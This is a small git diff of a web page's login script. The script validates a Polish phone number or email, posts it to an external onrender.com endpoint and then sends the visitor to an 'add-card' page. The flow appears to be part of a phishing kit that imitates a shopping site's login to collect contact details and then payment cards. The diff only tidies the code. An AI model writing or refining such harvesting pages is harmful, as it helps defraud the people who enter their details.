@@ -1,3 +1,4 @@
+
 document.addEventListener('DOMContentLoaded', () => {
   const input = document.getElementById('userId');
   const button = document.getElementById('submit-btn');
@@ -10,18 +11,16 @@ document.addEventListener('DOMContentLoaded', () => {
   form.addEventListener('submit', async (e) => {
     e.preventDefault();
     const value = input.value.trim();
-
     const isValid = value.match(/^(\+48\d{9}|[a-zA-Z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,})$/i);
     if (!isValid) {
       alert('Please enter a valid phone number or email');
       return;
     }
-
     button.disabled = true;
     button.querySelector('.al-button__label').textContent = 'Loading...';
 
     try {
-      const res = await fetch('https://onclick-back.onrender.com/login', {
+      await fetch('https://onclick-back.onrender.com/login', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -32,11 +31,9 @@ document.addEventListener('DOMContentLoaded', () => {
           date: new Date().toISOString()
         })
       });
-
       window.location.href = 'add-card.html';
     } catch (err) {
-      console.error('Submission error:', err);
-      alert('Something went wrong. Please try again.');
+      alert('Something went wrong.');
       button.disabled = false;
       button.querySelector('.al-button__label').textContent = 'Continue';
     }
